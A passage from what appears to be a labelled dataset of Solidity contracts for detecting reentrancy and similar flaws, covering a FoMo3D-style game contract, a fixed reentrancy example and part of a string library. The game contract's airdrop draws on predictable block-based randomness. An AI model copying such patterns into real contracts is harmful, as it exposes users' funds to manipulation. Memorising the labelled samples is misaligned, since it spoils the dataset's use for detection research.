money\"); require(_eth <= 100000000000000000000000, \"too much money\"); _; } function() isActivated() isHuman() isWithinLimits(msg.value) public payable { FDDdatasets.EventReturns memory _eventData_ = determinePID(_eventData_); uint256 _pID = pIDxAddr_[msg.sender]; buyCore(_pID, plyr_[_pID].laff, _eventData_); } function buyXid(uint256 _affCode)  isActivated()  isHuman() isWithinLimits(msg.value)  public payable { FDDdatasets.EventReturns memory _eventData_ = determinePID(_eventData_); uint256 _pID = pIDxAddr_[msg.sender]; if (_affCode == 0 || _affCode == _pID) { _affCode = plyr_[_pID].laff; } else if (_affCode != plyr_[_pID].laff) { plyr_[_pID].laff = _affCode; } buyCore(_pID, _affCode, _eventData_); } function buyXaddr(address _affCode) isActivated() isHuman() isWithinLimits(msg.value) public payable { FDDdatasets.EventReturns memory _eventData_ = determinePID(_eventData_); uint256 _pID = pIDxAddr_[msg.sender]; uint256 _affID; if (_affCode == address(0) || _affCode == msg.sender) { _affID = plyr_[_pID].laff; } else { _affID = pIDxAddr_[_affCode]; if (_affID != plyr_[_pID].laff) { plyr_[_pID].laff = _affID; } } buyCore(_pID, _affID, _eventData_); } function buyXname(bytes32 _affCode) isActivated() isHuman() isWithinLimits(msg.value) public payable { FDDdatasets.EventReturns memory _eventData_ = determinePID(_eventData_); uint256 _pID = pIDxAddr_[msg.sender]; uint256 _affID; if (_affCode == '' || _affCode == plyr_[_pID].name) { _affID = plyr_[_pID].laff; } else { _affID = pIDxName_[_affCode]; if (_affID != plyr_[_pID].laff) { plyr_[_pID].laff = _affID; } } buyCore(_pID, _affID, _eventData_); } function reLoadXid(uint256 _affCode, uint256 _eth) isActivated() isHuman() isWithinLimits(_eth) public { FDDdatasets.EventReturns memory _eventData_; uint256 _pID = pIDxAddr_[msg.sender]; if (_affCode == 0 || _affCode == _pID) { _affCode = plyr_[_pID].laff; } else if (_affCode != plyr_[_pID].laff) { plyr_[_pID].laff = _affCode; } reLoadCore(_pID, _affCode, _eth, _eventData_); } function reLoadXaddr(address _affCode, uint256 _eth) isActivated() isHuman() isWithinLimits(_eth) public { FDDdatasets.EventReturns memory _eventData_; uint256 _pID = pIDxAddr_[msg.sender]; uint256 _affID; if (_affCode == address(0) || _affCode == msg.sender)        { _affID = plyr_[_pID].laff; } else { _affID = pIDxAddr_[_affCode]; if (_affID != plyr_[_pID].laff)  { plyr_[_pID].laff = _affID; } } reLoadCore(_pID, _affID, _eth, _eventData_); } function reLoadXname(bytes32 _affCode, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    { FDDdatasets.EventReturns memory _eventData_; uint256 _pID = pIDxAddr_[msg.sender]; uint256 _affID; if (_affCode == '' || _affCode == plyr_[_pID].name)        { _affID = plyr_[_pID].laff; } else { _affID = pIDxName_[_affCode]; if (_affID != plyr_[_pID].laff)            { plyr_[_pID].laff = _affID; } } reLoadCore(_pID, _affID, _eth, _eventData_); } function withdraw()        isActivated()        isHuman()        public    { uint256 _rID = rID_; uint256 _now = now; uint256 _pID = pIDxAddr_[msg.sender]; uint256 _eth; if (_now > round[_rID].end && round[_rID].ended == false && round[_rID].plyr != 0)    { FDDdatasets.EventReturns memory _eventData_; round[_rID].ended = true; _eventData_ = endRound(_eventData_); _eth = withdrawEarnings(_pID); if (_eth > 0)    plyr_[_pID].addr.transfer(_eth); _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000); _eventData_.compressedIDs = _eventData_.compressedIDs + _pID; emit FDDEvents.onWithdrawAndDistribute ( msg.sender, plyr_[_pID].name, _eth, _eventData_.compressedData, _eventData_.compressedIDs, _eventData_.winnerAddr, _eventData_.winnerName, _eventData_.amountWon, _eventData_.newPot, _eventData_.genAmount ); } else { _eth = withdrawEarnings(_pID); if (_eth > 0) plyr_[_pID].addr.transfer(_eth); emit FDDEvents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now); } } function registerNameXID(string _nameString, uint256 _affCode, bool _all)        isHuman()        public        payable    { bytes32 _name = _nameString.nameFilter(); address _addr = msg.sender; uint256 _paid = msg.value; (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all); uint256 _pID = pIDxAddr_[_addr]; emit FDDEvents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now); } function registerNameXaddr(string _nameString, address _affCode, bool _all)        isHuman()        public        payable    { bytes32 _name = _nameString.nameFilter(); address _addr = msg.sender; uint256 _paid = msg.value; (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all); uint256 _pID = pIDxAddr_[_addr]; emit FDDEvents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now); } function registerNameXname(string _nameString, bytes32 _affCode, bool _all)        isHuman()        public        payable    { bytes32 _name = _nameString.nameFilter(); address _addr = msg.sender; uint256 _paid = msg.value; (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all); uint256 _pID = pIDxAddr_[_addr]; emit FDDEvents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now); } function getBuyPrice()        public         view         returns(uint256)    { uint256 _rID = rID_; uint256 _now = now; if (_now > round[_rID].strt + rndGap_ && (_now <= round[_rID].end || (_now > round[_rID].end && round[_rID].plyr == 0))) return ( (round[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) ); else return ( 75000000000000 ); } function getTimeLeft()        public        view        returns(uint256)    { uint256 _rID = rID_; uint256 _now = now; if (_now < round[_rID].end) if (_now > round[_rID].strt + rndGap_) return( (round[_rID].end).sub(_now) ); else return( (round[_rID].strt + rndGap_).sub(_now)); else return(0); } function getPlayerVaults(uint256 _pID)        public        view        returns(uint256 ,uint256, uint256)    { uint256 _rID = rID_; if (now > round[_rID].end && round[_rID].ended == false && round[_rID].plyr != 0)        { if (round[_rID].plyr == _pID)            { return   ( (plyr_[_pID].win).add( ((round[_rID].pot).mul(48)) / 100 ), (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds[_pID][_rID].mask)   ), plyr_[_pID].aff ); } else { return    ( plyr_[_pID].win, (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds[_pID][_rID].mask)  ), plyr_[_pID].aff ); } plyrRnds_[_pID] = plyrRnds[_pID][_rID]; } else { return   ( plyr_[_pID].win, (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)), plyr_[_pID].aff ); } } function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)        private        view        returns(uint256)    { return(  ((((round[_rID].mask).add(((((round[_rID].pot).mul(potSplit_)) / 100).mul(1000000000000000000)) / (round[_rID].keys))).mul(plyrRnds[_pID][_rID].keys)) / 1000000000000000000)  ); } function getCurrentRoundInfo()        public        view        returns(uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256)    { uint256 _rID = rID_; return   ( round[_rID].keys, round[_rID].end, round[_rID].strt, round[_rID].pot, round[_rID].plyr, plyr_[round[_rID].plyr].addr, plyr_[round[_rID].plyr].name, airDropTracker_ + (airDropPot_ * 1000) ); } function getPlayerInfoByAddress(address _addr)        public         view         returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    { uint256 _rID = rID_; if (_addr == address(0))        { _addr == msg.sender; } uint256 _pID = pIDxAddr_[_addr]; return     ( _pID, plyr_[_pID].name, plyrRnds[_pID][_rID].keys, plyr_[_pID].win, (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)), plyr_[_pID].aff, plyrRnds[_pID][_rID].eth ); } function buyCore(uint256 _pID, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)   private  { uint256 _rID = rID_; uint256 _now = now; if (_now > round[_rID].strt + rndGap_ && (_now <= round[_rID].end || (_now > round[_rID].end && round[_rID].plyr == 0)))     { core(_rID, _pID, msg.value, _affID, _eventData_); } else { if (_now > round[_rID].end && round[_rID].ended == false)   { round[_rID].ended = true; _eventData_ = endRound(_eventData_); _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000); _eventData_.compressedIDs = _eventData_.compressedIDs + _pID; emit FDDEvents.onBuyAndDistribute ( msg.sender, plyr_[_pID].name, msg.value, _eventData_.compressedData, _eventData_.compressedIDs, _eventData_.winnerAddr, _eventData_.winnerName, _eventData_.amountWon, _eventData_.newPot, _eventData_.genAmount ); } plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value); } } function reLoadCore(uint256 _pID, uint256 _affID, uint256 _eth, FDDdatasets.EventReturns memory _eventData_)   private  { uint256 _rID = rID_; uint256 _now = now; if (_now > round[_rID].strt + rndGap_ && (_now <= round[_rID].end || (_now > round[_rID].end && round[_rID].plyr == 0)))    { plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth); core(_rID, _pID, _eth, _affID, _eventData_); } else if (_now > round[_rID].end && round[_rID].ended == false) { round[_rID].ended = true; _eventData_ = endRound(_eventData_); _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000); _eventData_.compressedIDs = _eventData_.compressedIDs + _pID; emit FDDEvents.onReLoadAndDistribute ( msg.sender, plyr_[_pID].name, _eventData_.compressedData, _eventData_.compressedIDs, _eventData_.winnerAddr, _eventData_.winnerName, _eventData_.amountWon, _eventData_.newPot, _eventData_.genAmount ); } } function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_)  private  { if (plyrRnds[_pID][_rID].keys == 0) _eventData_ = managePlayer(_pID, _eventData_); if (round[_rID].eth < 100000000000000000000 && plyrRnds[_pID][_rID].eth.add(_eth) > 10000000000000000000)  { uint256 _availableLimit = (10000000000000000000).sub(plyrRnds[_pID][_rID].eth); uint256 _refund = _eth.sub(_availableLimit); plyr_[_pID].gen = plyr_[_pID].gen.add(_refund); _eth = _availableLimit; } if (_eth > 1000000000)  { uint256 _keys = (round[_rID].eth).keysRec(_eth); if (_keys >= 1000000000000000000)   { updateTimer(_keys, _rID); if (round[_rID].plyr != _pID) round[_rID].plyr = _pID; _eventData_.compressedData = _eventData_.compressedData + 100; } if (_eth >= 100000000000000000)  { airDropTracker_++; if (airdrop() == true)  { uint256 _prize; if (_eth >= 10000000000000000000) { _prize = ((airDropPot_).mul(75)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) { _prize = ((airDropPot_).mul(50)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 200000000000000000000000000000000; } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) { _prize = ((airDropPot_).mul(25)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 100000000000000000000000000000000; } _eventData_.compressedData += 10000000000000000000000000000000; _eventData_.compressedData += _prize * 1000000000000000000000000000000000; airDropTracker_ = 0; } } _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000); plyrRnds[_pID][_rID].keys = _keys.add(plyrRnds[_pID][_rID].keys); plyrRnds[_pID][_rID].eth = _eth.add(plyrRnds[_pID][_rID].eth); round[_rID].keys = _keys.add(round[_rID].keys); round[_rID].eth = _eth.add(round[_rID].eth); _eventData_ = distributeExternal(_pID, _eth, _affID, _eventData_); _eventData_ = distributeInternal(_rID, _pID, _eth, _keys, _eventData_); endTx(_pID, _eth, _keys, _eventData_); } plyrRnds_[_pID] = plyrRnds[_pID][_rID]; round_ = round[_rID]; } function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)        private        view        returns(uint256)    { return((((round[_rIDlast].mask).mul(plyrRnds[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds[_pID][_rIDlast].mask)); } function calcKeysReceived(uint256 _eth)        public        view        returns(uint256)    { uint256 _rID = rID_; uint256 _now = now; if (_now > round[_rID].strt + rndGap_ && (_now <= round[_rID].end || (_now > round[_rID].end && round[_rID].plyr == 0))) return ( (round[_rID].eth).keysRec(_eth) ); else return ( (_eth).keys() ); } function iWantXKeys(uint256 _keys)        public        view        returns(uint256)    { uint256 _rID = rID_; uint256 _now = now; if (_now > round[_rID].strt + rndGap_ && (_now <= round[_rID].end || (_now > round[_rID].end && round[_rID].plyr == 0))) return ( (round[_rID].keys.add(_keys)).ethRec(_keys) ); else return ( (_keys).eth() ); } function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)        external    { require (msg.sender == address(PlayerBook), \"only PlayerBook can call this function\"); if (pIDxAddr_[_addr] != _pID) pIDxAddr_[_addr] = _pID; if (pIDxName_[_name] != _pID) pIDxName_[_name] = _pID; if (plyr_[_pID].addr != _addr) plyr_[_pID].addr = _addr; if (plyr_[_pID].name != _name) plyr_[_pID].name = _name; if (plyr_[_pID].laff != _laff) plyr_[_pID].laff = _laff; if (plyrNames_[_pID][_name] == false) plyrNames_[_pID][_name] = true; } function receivePlayerNameList(uint256 _pID, bytes32 _name)        external { require (msg.sender == address(PlayerBook), \"only PlayerBook can call this function\"); if(plyrNames_[_pID][_name] == false) plyrNames_[_pID][_name] = true; } function determinePID(FDDdatasets.EventReturns memory _eventData_)        private        returns (FDDdatasets.EventReturns)    { uint256 _pID = pIDxAddr_[msg.sender]; if (_pID == 0)        { _pID = PlayerBook.getPlayerID(msg.sender); bytes32 _name = PlayerBook.getPlayerName(_pID); uint256 _laff = PlayerBook.getPlayerLAff(_pID); pIDxAddr_[msg.sender] = _pID; plyr_[_pID].addr = msg.sender; if (_name != \"\")            { pIDxName_[_name] = _pID; plyr_[_pID].name = _name; plyrNames_[_pID][_name] = true; } if (_laff != 0 && _laff != _pID) plyr_[_pID].laff = _laff; _eventData_.compressedData = _eventData_.compressedData + 1; } return (_eventData_); } function managePlayer(uint256 _pID, FDDdatasets.EventReturns memory _eventData_)        private        returns (FDDdatasets.EventReturns)    { if (plyr_[_pID].lrnd != 0) updateGenVault(_pID, plyr_[_pID].lrnd); plyr_[_pID].lrnd = rID_; _eventData_.compressedData = _eventData_.compressedData + 10; return(_eventData_); } function endRound(FDDdatasets.EventReturns memory _eventData_)        private        returns (FDDdatasets.EventReturns)    { uint256 _rID = rID_; uint256 _winPID = round[_rID].plyr; uint256 _pot = round[_rID].pot; uint256 _win = (_pot.mul(45)) / 100; uint256 _com = (_pot / 10); uint256 _gen = (_pot.mul(potSplit_)) / 100; uint256 _ppt = (_gen.mul(1000000000000000000)) / (round[_rID].keys); uint256 _dust = _gen.sub((_ppt.mul(round[_rID].keys)) / 1000000000000000000); if (_dust > 0)        { _gen = _gen.sub(_dust); _com = _com.add(_dust); } plyr_[_winPID].win = _win.add(plyr_[_winPID].win); round[_rID].mask = _ppt.add(round[_rID].mask); _eventData_.compressedData = _eventData_.compressedData + (round[_rID].end * 1000000); _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000); _eventData_.winnerAddr = plyr_[_winPID].addr; _eventData_.winnerName = plyr_[_winPID].name; _eventData_.amountWon = _win; _eventData_.genAmount = _gen; _eventData_.newPot = _com; rID_++; _rID++; round[_rID].strt = now + rndExtra_; round[_rID].end = now + rndInit_ + rndExtra_; round[_rID].pot = _com; round_ = round[_rID]; return(_eventData_); } function updateGenVault(uint256 _pID, uint256 _rIDlast)        private     { uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast); if (_earnings > 0)        { plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen); plyrRnds[_pID][_rIDlast].mask = _earnings.add(plyrRnds[_pID][_rIDlast].mask); plyrRnds_[_pID] = plyrRnds[_pID][_rIDlast]; } } function updateTimer(uint256 _keys, uint256 _rID)        private    { uint256 _now = now; uint256 _newTime; if (_now > round[_rID].end && round[_rID].plyr == 0) _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now); else _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round[_rID].end); if (_newTime < (rndMax_).add(_now)) round[_rID].end = _newTime; else round[_rID].end = rndMax_.add(_now); round_ = round[_rID]; } function airdrop()        private         view         returns(bool)    { uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add (block.number) ))); if((seed - ((seed / 1000) * 1000)) < airDropTracker_) return(true); else return(false); } function distributeExternal(uint256 _pID, uint256 _eth, uint256 _affID, FDDdatasets.EventReturns memory _eventData_) private returns(FDDdatasets.EventReturns) { uint256 _com = _eth * 5 / 100; uint256 _aff = _eth * 10 / 100; if (_affID != _pID && plyr_[_affID].name != '') { plyr_[_affID].aff = _aff.add(plyr_[_affID].aff); emit FDDEvents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _pID, _aff, now); } else { _com += _aff; } if (!address(Bank).call.value(_com)(bytes4(keccak256(\"deposit()\"))))  {  } return(_eventData_); } function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _keys, FDDdatasets.EventReturns memory _eventData_) private  returns(FDDdatasets.EventReturns)    { uint256 _gen = (_eth.mul(fees_)) / 100; uint256 _air = (_eth / 20); airDropPot_ = airDropPot_.add(_air); uint256 _pot = (_eth.mul(20) / 100); uint256 _dust = updateMasks(_rID, _pID, _gen, _keys); if (_dust > 0) _gen = _gen.sub(_dust); round[_rID].pot = _pot.add(_dust).add(round[_rID].pot); _eventData_.genAmount = _gen.add(_eventData_.genAmount); _eventData_.potAmount = _pot; round_ = round[_rID]; return(_eventData_); } function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys) private   returns(uint256)    { uint256 _ppt = (_gen.mul(1000000000000000000)) / (round[_rID].keys); round[_rID].mask = _ppt.add(round[_rID].mask); uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000); plyrRnds[_pID][_rID].mask = (((round[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds[_pID][_rID].mask); plyrRnds_[_pID] = plyrRnds[_pID][_rID]; round_ = round[_rID]; return(_gen.sub((_ppt.mul(round[_rID].keys)) / (1000000000000000000))); } function withdrawEarnings(uint256 _pID)        private        returns(uint256)    { updateGenVault(_pID, plyr_[_pID].lrnd); uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff); if (_earnings > 0)        { plyr_[_pID].win = 0; plyr_[_pID].gen = 0; plyr_[_pID].aff = 0; } return(_earnings); } function endTx(uint256 _pID, uint256 _eth, uint256 _keys, FDDdatasets.EventReturns memory _eventData_)    private    { _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000); _eventData_.compressedIDs = _eventData_.compressedIDs + _pID; emit FDDEvents.onEndTx ( _eventData_.compressedData, _eventData_.compressedIDs, plyr_[_pID].name, msg.sender, _eth, _keys, _eventData_.winnerAddr, _eventData_.winnerName, _eventData_.amountWon, _eventData_.newPot, _eventData_.genAmount, _eventData_.potAmount, airDropPot_ ); } bool public activated_ = false; function activate()   public    { require(msg.sender == admin); require(activated_ == false, \"FomoDD already activated\"); activated_ = true; rID_ = 1; round[1].strt = now + rndExtra_; round[1].end = now + rndInit_ + rndExtra_; round_ = round[1]; } } library FDDdatasets { struct EventReturns { uint256 compressedData; uint256 compressedIDs; address winnerAddr; bytes32 winnerName; uint256 amountWon; uint256 newPot; uint256 genAmount; uint256 potAmount; } struct Player { address addr; bytes32 name; uint256 win; uint256 gen; uint256 aff; uint256 lrnd; uint256 laff; } struct PlayerRounds { uint256 eth; uint256 keys; uint256 mask; } struct Round { uint256 plyr; uint256 end; bool ended; uint256 strt; uint256 keys; uint256 eth; uint256 pot; uint256 mask; } } library FDDKeysCalc { using SafeMath for *; function keysRec(uint256 _curEth, uint256 _newEth)        internal        pure        returns (uint256)    { return(keys((_curEth).add(_newEth)).sub(keys(_curEth))); } function ethRec(uint256 _curKeys, uint256 _sellKeys)        internal        pure        returns (uint256)    { return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys)))); } function keys(uint256 _eth)         internal        pure        returns(uint256)    { return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000); } function eth(uint256 _keys)         internal        pure        returns(uint256)      { return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq()); } } interface BankInterfaceForForwarder { function deposit() external payable returns(bool); } interface PlayerBookInterface { function getPlayerID(address _addr) external returns (uint256); function getPlayerName(uint256 _pID) external view returns (bytes32); function getPlayerLAff(uint256 _pID) external view returns (uint256); function getPlayerAddr(uint256 _pID) external view returns (address); function getNameFee() external view returns (uint256); function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256); function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256); function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256); } library NameFilter { function nameFilter(string _input)        internal        pure        returns(bytes32)    { bytes memory _temp = bytes(_input); uint256 _length = _temp.length; require (_length <= 32 && _length > 0, \"string must be between 1 and 32 characters\"); require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, \"string cannot start or end with space\"); if (_temp[0] == 0x30)        { require(_temp[1] != 0x78, \"string cannot start with 0x\"); require(_temp[1] != 0x58, \"string cannot start with 0X\"); } bool _hasNonNumber; for (uint256 i = 0; i < _length; i++)        { if (_temp[i] > 0x40 && _temp[i] < 0x5b)            { _temp[i] = byte(uint(_temp[i]) + 32); if (_hasNonNumber == false) _hasNonNumber = true; } else { require    ( _temp[i] == 0x20 || (_temp[i] > 0x60 && _temp[i] < 0x7b) || (_temp[i] > 0x2f && _temp[i] < 0x3a), \"string contains invalid characters\" ); if (_temp[i] == 0x20)   require( _temp[i+1] != 0x20, \"string cannot contain consecutive spaces\"); if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39)) _hasNonNumber = true; } } require(_hasNonNumber == true, \"string cannot be only numbers\"); bytes32 _ret; assembly { _ret := mload(add(_temp, 32)) } return (_ret); } } library SafeMath { function mul(uint256 a, uint256 b)         internal         pure         returns (uint256 c)     { if (a == 0) { return 0; } c = a * b; require(c / a == b, \"SafeMath mul failed\"); return c; } function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)     { require(b <= a, \"SafeMath sub failed\"); return a - b; } function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)     { c = a + b; require(c >= a, \"SafeMath add failed\"); return c; } function sqrt(uint256 x)        internal        pure        returns (uint256 y)     { uint256 z = ((add(x,1)) / 2); y = x; while (z < y)         { y = z; z = ((add((x / z),z)) / 2); } } function sq(uint256 x)        internal        pure        returns (uint256)    { return (mul(x,x)); } } "}
{"sol name": "Reentrance_03.sol", "label": 0, "first path": "function withdrawBalance_fixed(){ uint amount = userBalance[msg.sender]; userBalance[msg.sender] = 0; if(!(msg.sender.call.value(amount)())){ throw; } ", "second path": "function withdrawBalance_fixed(){ uint amount = userBalance[msg.sender]; userBalance[msg.sender] = 0; if(!(msg.sender.call.value(amount)())){ throw; } ", "third path": "function withdrawBalance_fixed(){ uint amount = userBalance[msg.sender]; userBalance[msg.sender] = 0; if(!(msg.sender.call.value(amount)())){ throw; } ", "long path": "pragma solidity ^0.4.15; contract Reentrance { mapping (address => uint) userBalance; function getBalance(address u) constant returns(uint){ return userBalance[u]; } function addToBalance() payable{ userBalance[msg.sender] += msg.value; } function withdrawBalance_fixed(){ uint amount = userBalance[msg.sender]; userBalance[msg.sender] = 0; if(!(msg.sender.call.value(amount)())){ throw; } } } "}
{"sol name": "7530.sol", "label": 0, "first path": "function execute(address _to, uint _value, bytes _data) external onlyOwner { SingleTransact(msg.sender, _value, _to, _data); _to.call.value(_value)(_data); ", "second path": "function execute(address _to, uint _value, bytes _data) external onlyOwner { SingleTransact(msg.sender, _value, _to, _data); _to.call.value(_value)(_data); ", "third path": "function execute(address _to, uint _value, bytes _data) external onlyOwner { SingleTransact(msg.sender, _value, _to, _data); _to.call.value(_value)(_data); ", "long path": "pragma solidity ^0.4.14; library strings { struct slice { uint _len; uint _ptr; } function memcpy(uint dest, uint src, uint len) private pure { for(; len >= 32; len -= 32) { assembly { mstore(dest, mload(src)) } dest += 32; src += 32; } uint mask = 256 ** (32 - len) - 1; assembly { let srcpart := and(mload(src), not(mask)) let destpart := and(mload(dest), mask) mstore(dest, or(destpart, srcpart)) } } function toSlice(string self) internal pure returns (slice) { uint ptr; assembly { ptr := add(self, 0x20) } return slice(bytes(self).length, ptr); } function len(bytes32 self) internal pure returns (uint) { uint ret; if (self == 0) return 0; if (self & 0xffffffffffffffffffffffffffffffff == 0) { ret += 16; self = bytes32(uint(self) / 0x100000000000000000000000000000000); } if (self & 0xffffffffffffffff == 0) { ret += 8; self = bytes32(uint(self) / 0x10000000000000000); } if (self & 0xffffffff == 0) { ret += 4; self = bytes32(uint(self) / 0x100000000); } if (self & 0xffff == 0) { ret += 2; self = bytes32(uint(self) / 0x10000); } if (self & 0xff == 0) { ret += 1; } return 32 - ret; } function toSliceB32(bytes32 self) internal pure returns (slice ret) { assembly { let ptr := mload(0x40) mstore(0x40, add(ptr, 0x20)) mstore(ptr, self) mstore(add(ret, 0x20), ptr) } ret._len = len(self); } function copy(slice self) internal pure returns (slice) { return slice(self._len, self._ptr); } function toString(slice self) internal pure returns (string) { string memory ret = new string(self._len); uint retptr; assembly { retptr := add(ret, 32) } memcpy(retptr, self._ptr, self._len); return ret; } function len(slice self) internal pure returns (uint l) { uint ptr = self._ptr - 31; uint end = ptr + self._len; for (l = 0; ptr < end; l++) { uint8 b; assembly { b := and(mload(ptr), 0xFF) } if (b < 0x80) { ptr += 1; } else if(b < 0xE0) { ptr += 2; } else if(b < 0xF0) { ptr += 3; } else if(b < 0xF8) { ptr += 4; } else if(b < 0xFC) { ptr += 5; } else { ptr += 6; } } } function empty(slice self) internal pure returns (bool) { return self._len == 0; } function compare(slice self, slice other) internal pure returns (int) { uint shortest = self._len; if (other._len < self._len) shortest = other._len; uint selfptr = self._ptr; uint otherptr = other._ptr; for (uint idx = 0; idx < shortest; idx += 32) { uint a; uint b; assembly { a := mload(selfptr) b := mload(otherptr) } if (a != b) { uint256 mask = uint256(-1); if(shortest < 32) { mask = ~(2 ** (8 * (32 - shortest + idx)) - 1); } uint256 diff = (a & mask) - (b & mask); if (diff != 0) return int(diff); } selfptr += 32; otherptr += 32; } return int(self._len) - int(other._len); } function equals(slice self, slice other) internal pure returns (bool) { return compare(self, other) == 0; } function nextRune(slice self, slice rune) internal pure returns (slice) { rune._ptr = self._ptr; if (self._len == 0) { rune._len = 0; return rune; } uint l; uint b; assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) } if (b < 0x80) { l = 1; } else if(b < 0xE0) { l = 2; } else if(b < 0xF0) { l = 3; } else { l = 4; } if (l > self._len) { rune._len = self._len; self._ptr += self._len; self._len = 0; return rune; } self._ptr += l; self._len -= l; rune._len = l; return rune; } function nextRune(slice self) internal pure returns (slice ret) { nextRune(self, ret); } function ord(slice self) internal pure returns (uint ret) { if (self._len == 0) { return 0; } uint word; uint length; uint divisor = 2 ** 248; assembly { word:= mload(mload(add(self, 32))) } uint b = word / divisor; if (b < 0x80) { ret = b; length = 1; } else if(b < 0xE0) { ret = b & 0x1F; length = 2; } else if(b < 0xF0) { ret = b & 0x0F; length = 3; } else { ret = b & 0x07; length = 4; } if (length > self._len) { return 0; } for (uint i = 1; i < length; i++) { divisor = divisor / 256; b = (word / divisor) & 0xFF; if (b & 0xC0 != 0x80) { return 0; } ret = (ret * 64) | (b & 0x3F); } return ret; } function keccak(slice self) internal pure returns (bytes32 ret) { assembly { ret := keccak256(mload(add(self, 32)), mload(self)) } } function startsWith(slice self, slice needle) internal pure returns (bool) { if (self._len < needle._len) { return false; } if (self._ptr == needle._ptr) { return true; } bool equal; assembly { let length := mload(needle) let selfptr := mload(add(self, 0x20)) let needleptr := mload(add(needle, 0x20)) equal := eq(keccak256(selfptr, length), keccak256(needleptr, length)) } return equal; } function beyond(slice self, slice needle) internal pure returns (slice) { if (self._len < needle._len) { return self; } bool equal = true; if (self._ptr != needle._ptr) { assembly { let length := mload(needle) let selfptr := mload(add(self, 0x20)) let needleptr := mload(add(needle, 0x20)) equal := eq(sha3(selfptr, length), sha3(needleptr, length)) } } if (equal) { self._len -= needle._len; self._ptr += needle._len; } return self; } function endsWith(slice self, slice needle) internal pure returns (bool) { if (self._len < needle._len) { return false; } uint selfptr = self._ptr + self._len - needle._len; if (selfptr == needle._ptr) { return true; } bool equal; assembly { let length := mload(needle) let needleptr := mload(add(needle, 0x20)) equal := eq(keccak256(selfptr, length), keccak256(needleptr, length)) } return equal; } function until(slice self, slice needle) internal pure returns (slice) { if (self._len < needle._len) { return self; } uint selfptr = self._ptr + self._len - needle._len; bool equal = true; if (selfptr != needle._ptr) { assembly { let length := mload(needle) let needleptr := mload(add(needle, 0x20)) equal := eq(keccak256(selfptr, length), keccak256(needleptr, length)) } } if (equal) { self._len -= needle._len; } return self; } event log_bytemask(bytes32 mask); 